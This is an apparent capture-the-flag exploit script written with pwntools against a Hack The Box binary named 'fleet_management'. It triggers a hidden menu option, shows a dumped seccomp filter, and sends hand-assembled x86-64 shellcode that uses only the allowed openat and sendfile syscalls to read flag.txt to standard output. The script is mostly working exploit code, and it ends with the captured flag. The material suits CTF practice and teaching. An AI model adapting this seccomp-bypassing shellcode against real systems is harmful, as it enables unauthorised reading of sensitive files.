#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('fleet_management')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote("1.1.1.1", 31697)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break beta_feature
continue
'''.format(**locals())


io = start()
print(io.recvuntil(b"do? "))
io.sendline(b"9")

'''
 line  CODE  JT   JF      K
 =================================
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011
0005: 0x15 0x04 0x00 0x0000000f  if (A == rt_sigreturn) goto 0010
0006: 0x15 0x03 0x00 0x00000028  if (A == sendfile) goto 0010
0007: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0010
0008: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0010
0009: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0011
0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0011: 0x06 0x00 0x00 0x00000000  return KILL
'''

# so use openat() to open flag.txt, then use sendfile() to rw to stdout
# openat == syscall 257
    # openat(AT_FDCWD, &"flag.txt", NULL, NULL)
# sendfile == syscall 40
    # sendfile(1, 3, NULL, 32)

# max length 60 bytes
payload = asm('''
    xor rdx, rdx
    push rdx
    mov rsi, 0x7478742e67616c66
    push rsi
    mov rdi, 0xffffffffffffff9c
    mov rsi, rsp
    mov rax, 257
    syscall
    mov rdi, 1
    mov rsi, rax
    mov r10, 32
    mov rax, 40
    syscall
''')
io.sendline(payload)
io.interactive()

# HTB{backd00r_as_a_f3atur3}





